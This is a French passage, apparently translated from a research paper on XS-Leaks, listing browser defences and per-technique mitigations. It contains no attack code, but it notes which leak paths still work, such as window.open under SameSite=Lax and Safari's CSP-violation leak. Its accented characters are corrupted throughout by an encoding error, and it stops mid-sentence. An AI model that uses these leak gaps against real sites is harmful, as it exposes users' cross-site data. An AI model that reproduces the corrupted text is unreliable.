* **M√©tadonn√©es Fetch**. Ces en-t√™tes de demande permettent aux propri√©taires de serveurs de mieux comprendre comment le navigateur de l'utilisateur a provoqu√© une demande sp√©cifique. Dans Chrome, les en-t√™tes Sec-Fetch-\* sont automatiquement ajout√©s √† chaque demande et fournissent des m√©tadonn√©es sur la provenance de la demande. Par exemple, Sec-Fetch-Dest: image a √©t√© d√©clench√© √† partir d'un √©l√©ment image. Les applications Web peuvent ensuite choisir de bloquer les demandes en fonction de ces informations.
* **Cookies Same-Site**. Le drapeau Same-Site permet aux sites Web de d√©clarer **si un cookie doit √™tre restreint au contexte same-site ou first-party**. Tous les principaux navigateurs prennent en charge les cookies Same-Site. Dans GC, les cookies sans l'attribut sont d√©sormais Lax par d√©faut. Pour les XS-Leaks, **les cookies Same-Site limitent consid√©rablement les possibilit√©s d'attaque de fuite**. En revanche, les techniques de fuite qui reposent sur **`window.open` fonctionnent toujours avec `SameSite=Lax`**. Les sites Web qui utilisent **d'autres m√©thodes d'authentification**, telles que les certificats c√¥t√© client et l'authentification HTTP, **restent vuln√©rables**.
* **D√©solidarisation des identificateurs de source crois√©e (COIU)**. COIU, √©galement connu sous le nom d'isolation de premi√®re partie (FPI), est une fonctionnalit√© de s√©curit√© facultative que les utilisateurs peuvent activer dans les param√®tres experts de FF (about:config) et qui a √©t√© initialement introduite dans Tor Browser. Dans une vue abstraite, c'est un contexte same-site √©tendu. Il **lie plusieurs ressources** (par exemple, les cookies, le cache, les stockages c√¥t√© client) **√† la premi√®re partie** au lieu de les partager entre tous les sites visit√©s. S'il est activ√©, COIU diminue consid√©rablement l'applicabilit√© des XS-Leaks, car seules les m√©thodes utilisant des pop-ups sont encore possibles pour r√©pondre √† l'exigence de premi√®re partie de la politique.
* **Protections de suivi**. Apple a mis en place un m√©canisme de confidentialit√© appel√© **Intelligent Tracking Prevention (ITP)** dans SA qui vise √† lutter contre le suivi inter-sites en limitant les capacit√©s des cookies et d'autres API Web. Dans les versions plus r√©centes de SA, ITP bloque tous les cookies tiers par d√©faut sans exception \[74]. Ce blocage emp√™che toutes les fuites qui ne sont pas bas√©es sur des pop-ups. FF a adopt√© une approche similaire avec Enhanced Tracking Prevention (ETP), mais ils ne bloquent que des cookies tiers sp√©cifiques appartenant √† des fournisseurs de suivi. Dans le contexte des XS-Leaks, ETP ne att√©nue que les techniques de fuite qui ciblent ces domaines de suivi.
* **Extensions de navigateur**. Les utilisateurs conscients de la s√©curit√© peuvent utiliser des **extensions de navigateur pour emp√™cher certaines m√©thodes d'inclusion**.

### Mesures d'att√©nuation des techniques de fuite

* **Gestionnaire d'√©v√©nements**. La **mesure d'att√©nuation la plus efficace** pour cette technique de fuite serait de **les refuser toutes**, mais cela casserait la majorit√© des applications Web sur Internet. Nous proposons donc de **r√©duire le nombre d'informations n√©cessaires qui peuvent √™tre recueillies dans les √©v√©nements**. Par exemple, l'√©v√©nement de violation de CSP ne doit pas contenir l'URL de destination de redirection dans le champ blockedURI. Ce comportement est impl√©ment√© dans FF et dans les versions plus r√©centes de GC - SA reste vuln√©rable.
* **Messages d'erreur**. Pour att√©nuer les XS-Leaks bas√©s sur la technique de fuite des messages d'erreur, il y a deux exigences majeures. Premi√®rement, **les messages d'erreur ne doivent pas contenir d'informations d√©taill√©es**, de mani√®re similaire aux messages de gestionnaire d'√©v√©nements. Deuxi√®mement, les navigateurs doivent **minimiser les occurrences de messages d'erreur**. Les XS-Leaks tels que SRI Error, ContentDocument XFO ou Fetch Redirect d√©tectent si un message d'erreur est lanc√© ou non.
* **Limites globales**. La correction des techniques de fuite qui abusent des limites globales est relativement complexe car elles reposent sur des restrictions physiques. La recommandation g√©n√©rale est donc de **restreindre les limites globales sur une petite base par site**. Si la limite globale est de 1, comme pour l'API de paiement, l'attaquant peut tenter silencieusement d'activer l'interface utilisateur de paiement Web √† tout moment, ce qui ne r√©ussit que si l'interface utilisateur n'est pas utilis√©e simultan√©ment par un autre onglet. Nous recommandons d'acc√©der √† l'API de paiement
